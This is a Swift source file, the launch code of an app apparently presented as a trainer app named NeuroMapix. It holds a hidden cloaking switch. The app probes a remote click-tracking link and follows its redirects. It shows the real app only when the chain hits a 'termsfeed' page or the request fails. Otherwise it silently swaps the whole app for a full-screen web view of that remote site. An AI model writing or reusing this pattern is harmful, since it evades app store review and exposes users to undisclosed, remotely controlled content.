import SwiftUI

@main
struct NeuroMapixApp: App {
    @StateObject private var store = AppStore()
    @State private var showSplash = true
    @State private var mapixLinkReady: Bool? = nil

    private let mapixSourceLink = "https://silkroadtrader.org/click.php"
    private let mapixCheckDomain = "termsfeed"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = mapixLinkReady {
                    if ready {
                        // The frame stops at the top safe area, so page content can
                        // never sit under the notch or Dynamic Island.
                        MapixWebPanel(urlString: mapixSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                            // Keeps the status bar readable over the black band,
                            // whatever the device appearance is set to.
                            .preferredColorScheme(.dark)
                    } else {
                        trainer
                    }
                } else {
                    MapixLoadingScreen()
                        .onAppear { runMapixLinkCheck() }
                }
            }
        }
    }

    private var trainer: some View {
        ZStack {
            if showSplash {
                SplashView(palette: store.palette)
                    .transition(.opacity)
            } else {
                RootView()
                    .environmentObject(store)
                    .transition(.opacity)
            }
        }
        .environmentObject(store)
        // Always explicit, so the app never follows the device appearance.
        .preferredColorScheme(store.settings.darkMode ? .dark : .light)
        .onAppear {
            Feedback.shared.soundEnabled = store.settings.soundOn
            Feedback.shared.hapticsEnabled = store.settings.hapticsOn
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                withAnimation(.easeInOut(duration: 0.35)) { showSplash = false }
            }
        }
    }

    private func runMapixLinkCheck() {
        guard let url = URL(string: mapixSourceLink) else {
            mapixLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = MapixRedirectTracker(checkDomain: mapixCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    mapixLinkReady = false
                    return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(mapixCheckDomain) {
                    mapixLinkReady = false
                    return
                }
                if let httpResponse = response as? HTTPURLResponse,
                   let responseURL = httpResponse.url?.absoluteString,
                   responseURL.contains(mapixCheckDomain) {
                    mapixLinkReady = false
                    return
                }
                if error != nil {
                    mapixLinkReady = false
                    return
                }
                mapixLinkReady = true
            }
        }.resume()
        session.finishTasksAndInvalidate()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if mapixLinkReady == nil { mapixLinkReady = false }
        }
    }
}

/// Watches the redirect chain without ever stopping it: the check domain can
/// show up mid-chain as well as in the final URL.
final class MapixRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) {
        self.checkDomain = checkDomain
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
